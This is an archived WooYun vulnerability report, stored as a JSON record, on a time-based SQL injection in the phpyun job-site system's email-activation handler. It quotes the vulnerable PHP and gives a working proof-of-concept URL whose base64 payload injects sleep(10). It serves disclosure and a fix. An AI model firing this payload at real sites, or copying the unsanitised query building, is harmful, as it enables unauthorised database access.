{"id": 6023, "wybug_id": "wooyun-2013-043236", "wybug_title": "phpyun另一枚SQL注入", "wybug_corp": "php云人才系统", "wybug_author": "猪头子", "wybug_date": "2013-11-18 14:28", "wybug_open_date": "2014-02-16 14:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-21：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-01-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-16：\t细节向公众公开  简要描述： 问题很类似，官方安全意识有待加强 详细说明：  问题出现在/model/qqconnect.class.php的mcert_action函数中：\nfunction mcert_action(){    \t        $id=$_GET['id'];\t\t$arr=@explode(\"|\",base64_decode($id));\t\tif($id && is_array($arr) && $arr[0] && $arr[2]==$this->config['coding']){\t\t\t$nid=$this->obj->DB_update_all(\"member\",\"`email_status`='1'\",\"`uid`='\".$arr[0].\"'\"); \t\t\t$nid?$this->obj->ACT_msg($this->config['sy_weburl'].\"/index.php?M=login&usertype=1\",\"激活成功\"):$this->obj->ACT_msg($this->config['sy_weburl'],\"激活失败，联系管理员认证\");\t\t}else{\t\t\t$this->obj->ACT_msg($this->config['sy_weburl'],\"非法操作！\",\"2\");\t\t}    }\nid从$_GET['id']参数中取出然后经过了base64解码并分隔进入数组$arr，由于是base64解码所以绕过前端过滤：\n$id=$_GET['id'];$arr=@explode(\"|\",base64_decode($id));\n然后经过一段判断：\nif($id && is_array($arr) && $arr[0] && $arr[2]==$this->config['coding'])\n$this->config['coding']默认为null，所以只需要保证$arr[2]也为null的话这个判断就可以通过，判断通过后进入以下语句：\n$nid=$this->obj->DB_update_all(\"member\",\"`email_status`='1'\",\"`uid`='\".$arr[0].\"'\");\n跟进DB_update_all:\nfunction DB_update_all($tablename, $value, $where = 1) {\t    $SQL = \"UPDATE `\" . $this->def . $tablename . \"` SET \".$value.\" WHERE \".$where;  \t\t$this->db->query(\"set sql_mode=''\");\t\t$return=$this->db->query($SQL);\t\treturn $return;\t}\n跟进query:\n/*数据库执行语句，可执行查询添加修改删除等任何sql语句*/\tpublic function query($sql) {\t\tif ($sql == \"\") {\t\t\t$this->show_error(\"SQL语句错误：\", \"SQL查询语句为空\");\t\t}\t\t$this->sql = $sql;\t\t$result = mysql_query($this->sql, $this->conn);\t\tif (!$result) {\t\t\t//调试中使用，sql语句出错时会自动打印出来\t\t\tif ($this->show_error) {\t\t\t\t$this->show_error(\"错误SQL语句：\", $this->sql);\t\t\t}\t\t} else {\t\t\t$this->result = $result;\t\t}\t\tif(1==1){\t\t\tglobal $starttime;\t\t\t$dbbug_error2[]=\"<br>\";\t\t\t$dbbug_error2[sql]=$this->sql.\"<br>\";\t\t\t$dbbug_error2[\"time\"]=$this->getmicrotime()-$starttime.\"<br>\";\t\t\t//$dbbug_error2[]=\"<br>\";\t\t\t//print_r($dbbug_error2);//查看sql语句\t\t\t$this->debug=$dbbug_error;\t\t}\t\treturn $this->result;\t}\n注入发生   漏洞证明：  提交\nhttp://www.target.com/index.php?M=qqconnect&C=mcert&id=JyBvciBzbGVlcCgxMCk7I3x6dHo%3D\n后台会执行sleep(10)\nUPDATE `phpyun_member` SET `email_status`='1' WHERE `uid`='' or sleep(10);#\n   修复方案：  对base64解码的内容进行过滤和检查   版权声明：转载请注明来源 猪头子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2013-11-18 15:58 厂商回复： 感谢您的提供！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}